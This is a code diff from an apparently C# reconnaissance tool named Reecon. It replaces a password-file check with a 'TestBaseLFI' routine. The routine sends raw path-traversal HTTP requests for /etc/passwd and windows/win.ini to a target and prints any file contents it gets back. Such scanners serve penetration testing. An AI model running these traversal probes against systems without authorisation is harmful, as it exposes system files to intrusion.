@@ -20,10 +20,10 @@ namespace Reecon
             string portData = FormatResponse(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert);
             string robotsFile = CheckRobots(ip, port, isHTTPS);
             portData = robotsFile + portData;
-            string passwdFile = CheckPasswd(ip, port);
-            if (passwdFile != "")
+            string baseLFI = TestBaseLFI(ip, port);
+            if (baseLFI != "")
             {
-                portData += Environment.NewLine + passwdFile + Environment.NewLine;
+                portData += Environment.NewLine + baseLFI + Environment.NewLine;
             }
             if (portData == "")
             {
@@ -148,14 +148,19 @@ namespace Reecon
             return returnText;
         }
 
-        private static string CheckPasswd(string ip, int port)
+        private static string TestBaseLFI(string ip, int port)
         {
-            string result = General.BannerGrab(ip, port, "GET /../../../../../../etc/passwd" + Environment.NewLine + Environment.NewLine, 2500);
+            string result = General.BannerGrab(ip, port, "GET /../../../../../../etc/passwd HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
             if (result.Contains("root"))
             {
-                return "- Hidden Passwd File Found (GET /../../../../../../etc/passwd)!" + Environment.NewLine + result;
+                return "- etc/passwd File Found VIA Base LFI! --> GET /../../../../../../etc/passwd" + Environment.NewLine + result;
                 // Need to format this better...
 
+            }
+            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
+            if (result.Contains("for 16-bit app support"))
+            {
+                return "- windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
             }
             return "";
         }
